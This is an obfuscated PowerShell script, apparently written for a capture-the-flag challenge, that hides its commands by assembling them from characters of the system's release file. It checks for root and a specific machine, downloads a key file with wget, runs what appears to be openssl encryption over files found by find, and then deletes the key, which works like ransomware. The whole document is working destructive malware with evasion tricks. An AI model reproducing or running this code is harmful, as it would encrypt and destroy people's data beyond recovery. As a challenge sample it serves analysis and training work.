function main 
{
    A47
    A43
    A50
    A44
    A41
    exit
}

function A47 
{
    if ([int](&(Get-Command /???/id) -u) -cne -not [bool][byte]){exit}
    if (-not ((&(Get-Command /???/?at) /etc/*release*) | grep noble)){exit}
    if ((&(Get-Command /???/?at) /sys/class/net/enp0s3/address) -cne "08:00:27:eb:6b:49"){exit} # intentional guard in chal to prevent accidentally running the script
}

function A43
{
    $A42 = (&(Get-Command /???/?at) /etc/*release*).split('\n')
    $A45 = ($A42[0] += $A42[1].split('=')[0] += $A42[2] += $A42[3].split('=')[0] += $A42[4].split('=')[0] += $A42[5] += $A42[6].split('=')[0] += $A42[7].split('=')[0] += $A42[8] += $A42[9] += $A42[10] += $A42[11] += $A42[12] += $A42[13] += $A42[14] += $A42[15] += $A42[16]).Tochararray() + 0..9
    $A45 = (-join ($A45 | sort-object | get-unique))
    $Global:A48 = $A45
}

function A50 
{
    $A40 = $GLOBAL:A48[3] + $GLOBAL:A48[5] + $GLOBAL:A48[12] + $GLOBAL:A48[8] + $GLOBAL:A48[7] + $GLOBAL:A48[12] + $GLOBAL:A48[1] + $GLOBAL:A48[6] + $GLOBAL:A48[5] + $GLOBAL:A48[12] + $GLOBAL:A48[6] + $GLOBAL:A48[5] + $GLOBAL:A48[14] + $GLOBAL:A48[3] + $GLOBAL:A48[1] + $GLOBAL:A48[3] + $GLOBAL:A48[3] + $GLOBAL:A48[7] + $GLOBAL:A48[13] + 'k' + $GLOBAL:A48[41] + $GLOBAL:A48[56]
    $A45A = $GLOBAL:A48[16]
    &(Get-Command /???/?ge?) $A40 -q -O $A45A
}

function A44
{
    foreach ($mainA in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:A48[44] + $GLOBAL:A48[47] + $GLOBAL:A48[40] + ' ' + $GLOBAL:A48[13] + $GLOBAL:A48[48] + $GLOBAL:A48[49] + $GLOBAL:A48[52] + $GLOBAL:A48[13] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[52] + $GLOBAL:A48[56] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + ' ' + 'f')))
    {
        &(Get-Command I?????-E?????????) ("" + $GLOBAL:A48[48] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + $GLOBAL:A48[45] + ' ' + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[37] + $GLOBAL:A48[41] + $GLOBAL:A48[51] + $GLOBAL:A48[11] + $GLOBAL:A48[2] + $GLOBAL:A48[5] + $GLOBAL:A48[6] + $GLOBAL:A48[11] + $GLOBAL:A48[39] + $GLOBAL:A48[38] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[49] + $GLOBAL:A48[37] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + ' ' + 'f' + $GLOBAL:A48[44] + $GLOBAL:A48[45] + $GLOBAL:A48[41] + $GLOBAL:A48[14] + 'k' + $GLOBAL:A48[41] + $GLOBAL:A48[56] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[44] + $GLOBAL:A48[47] + ' ' + " $mainA " + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[48] + $GLOBAL:A48[53] + $GLOBAL:A48[52] + ' ' + " $A20A10A5A3A ")
    } 

    foreach ($mainA in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:A48[44] + $GLOBAL:A48[47] + $GLOBAL:A48[40] + ' ' + $GLOBAL:A48[13] + $GLOBAL:A48[43] + $GLOBAL:A48[48] + $GLOBAL:A48[46] + $GLOBAL:A48[41] + $GLOBAL:A48[13] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[52] + $GLOBAL:A48[56] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + ' ' + 'f')))
    {
        &(Get-Command I?????-E?????????) ("" + $GLOBAL:A48[48] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + $GLOBAL:A48[45] + ' ' + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[37] + $GLOBAL:A48[41] + $GLOBAL:A48[51] + $GLOBAL:A48[11] + $GLOBAL:A48[2] + $GLOBAL:A48[5] + $GLOBAL:A48[6] + $GLOBAL:A48[11] + $GLOBAL:A48[39] + $GLOBAL:A48[38] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[49] + $GLOBAL:A48[37] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + ' ' + 'f' + $GLOBAL:A48[44] + $GLOBAL:A48[45] + $GLOBAL:A48[41] + $GLOBAL:A48[14] + 'k' + $GLOBAL:A48[41] + $GLOBAL:A48[56] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[44] + $GLOBAL:A48[47] + ' ' + " $mainA " + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[48] + $GLOBAL:A48[53] + $GLOBAL:A48[52] + ' ' + " $A20A10A5A3A ")
    } 

    foreach ($mainA in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:A48[44] + $GLOBAL:A48[47] + $GLOBAL:A48[40] + ' ' + $GLOBAL:A48[13] + $GLOBAL:A48[41] + $GLOBAL:A48[52] + $GLOBAL:A48[39] + $GLOBAL:A48[13] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[52] + $GLOBAL:A48[56] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + ' ' + 'f' )))
    {
        &(Get-Command I?????-E?????????) ("" + $GLOBAL:A48[48] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + $GLOBAL:A48[45] + ' ' + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[37] + $GLOBAL:A48[41] + $GLOBAL:A48[51] + $GLOBAL:A48[11] + $GLOBAL:A48[2] + $GLOBAL:A48[5] + $GLOBAL:A48[6] + $GLOBAL:A48[11] + $GLOBAL:A48[39] + $GLOBAL:A48[38] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[49] + $GLOBAL:A48[37] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + ' ' + 'f' + $GLOBAL:A48[44] + $GLOBAL:A48[45] + $GLOBAL:A48[41] + $GLOBAL:A48[14] + 'k' + $GLOBAL:A48[41] + $GLOBAL:A48[56] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[44] + $GLOBAL:A48[47] + ' ' + " $mainA " + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[48] + $GLOBAL:A48[53] + $GLOBAL:A48[52] + ' ' + " $A20A10A5A3A ")
    } 

    foreach ($mainA in (&(Get-Command I?????-E?????????) ('f' + $GLOBAL:A48[44] + $GLOBAL:A48[47] + $GLOBAL:A48[40] + ' ' + $GLOBAL:A48[13] + $GLOBAL:A48[54] + $GLOBAL:A48[37] + $GLOBAL:A48[50] + $GLOBAL:A48[13] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[52] + $GLOBAL:A48[56] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + ' ' + 'f')))
    {
        &(Get-Command I?????-E?????????) ("" + $GLOBAL:A48[48] + $GLOBAL:A48[49] + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + $GLOBAL:A48[45] + ' ' + $GLOBAL:A48[41] + $GLOBAL:A48[47] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[37] + $GLOBAL:A48[41] + $GLOBAL:A48[51] + $GLOBAL:A48[11] + $GLOBAL:A48[2] + $GLOBAL:A48[5] + $GLOBAL:A48[6] + $GLOBAL:A48[11] + $GLOBAL:A48[39] + $GLOBAL:A48[38] + $GLOBAL:A48[39] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[49] + $GLOBAL:A48[37] + $GLOBAL:A48[51] + $GLOBAL:A48[51] + ' ' + 'f' + $GLOBAL:A48[44] + $GLOBAL:A48[45] + $GLOBAL:A48[41] + $GLOBAL:A48[14] + 'k' + $GLOBAL:A48[41] + $GLOBAL:A48[56] + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[44] + $GLOBAL:A48[47] + ' ' + " $mainA " + ' ' + $GLOBAL:A48[11] + $GLOBAL:A48[48] + $GLOBAL:A48[53] + $GLOBAL:A48[52] + ' ' + " $A20A10A5A3A ")
    }
}

function A41
{
    &(Get-Command R?m???-I???) $GLOBAL:A48[16]
}


main
